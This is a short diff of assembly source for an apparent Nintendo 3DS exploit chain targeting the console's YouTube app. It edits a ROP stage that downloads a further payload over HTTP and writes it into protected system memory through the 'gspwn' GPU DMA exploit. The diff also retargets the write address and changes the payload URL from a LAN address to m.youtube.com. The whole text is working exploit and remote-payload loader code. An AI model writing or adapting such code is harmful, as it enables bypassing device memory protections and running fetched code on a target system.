@@ -1,6 +1,6 @@
 .nds
 
-.create "ytb_payload_secondary.bin",0x0
+.create "ytb_rop.bin",0x0
 
 .include "../ytb_include/ytb_include.s"
 
@@ -27,7 +27,7 @@ PARAMBLK_LOC equ (PAYLOAD_LOC + paramblk)
 	httpcReceiveData PAYLOAD_LOC + httpcSecondHandle, PAYLOAD_LOC + httpcContextHandle, PAYLOAD_THIRD_LOC, 0x00100000
 	
 	flush_dcache PAYLOAD_THIRD_LOC, 0x00100000
-	gspwn 0x37601000, PAYLOAD_THIRD_LOC, 0x0000A000
+	gspwn (0x30000000 + FIRM_SYSTEM_LINEAR_OFFSET - 0x5FF000), PAYLOAD_THIRD_LOC, 0x0000A000
 	sleep 100*1000*1000, 0
 	
 	gspgpuSetBufferSwap 0, 0x14C00000, (1<<8)|(1<<6)|1
@@ -51,7 +51,7 @@ PARAMBLK_LOC equ (PAYLOAD_LOC + paramblk)
 		.word 0x00000000
 		.word 0x00000000
 	payloadUrl:
-		.ascii "http://192.168.109.1/sec_payload.bin"
+		.ascii "http://m.youtube.com/sec_payload.bin"
 		.byte 0x00
 
 .fill (0x800 - .), 0xff
